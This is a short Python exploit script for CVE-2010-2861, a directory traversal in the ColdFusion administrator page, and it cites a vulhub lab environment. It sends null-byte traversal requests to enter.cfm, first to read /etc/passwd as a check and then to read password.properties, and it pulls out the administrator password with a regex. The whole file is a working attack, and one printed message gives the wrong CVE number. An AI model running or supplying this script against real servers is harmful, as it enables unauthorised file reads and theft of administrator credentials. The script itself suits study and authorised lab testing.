''''
author:九世
time:2019/1/26
source:https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/
'''

import requests
import re

def exploit(url):
    payload='/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en'
    guanjianzi='/bin/bash'
    payload2='/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en'
    urls=str(url).rstrip('/').strip()+payload
    urls2=str(url).rstrip('/').strip()+payload2
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
    try:
        rqt=requests.get(url=urls,headers=headers,timeout=10)
        if guanjianzi in rqt.text:
            id=1
            print('[+] Found CVE-2010-2861')
        else:
            id=0
            print('[-] Not Found CVE-2018-2861')
        uuid=id
        if uuid>0:
            rqs=requests.get(url=urls2,headers=headers,timeout=10)
            passwd=re.findall('password=[0-9-A-Z].*',rqs.text)
            print('[+] administrator password:{}'.format(passwd[0]))
    except Exception as r:
        print('[!] Error {}'.format(r))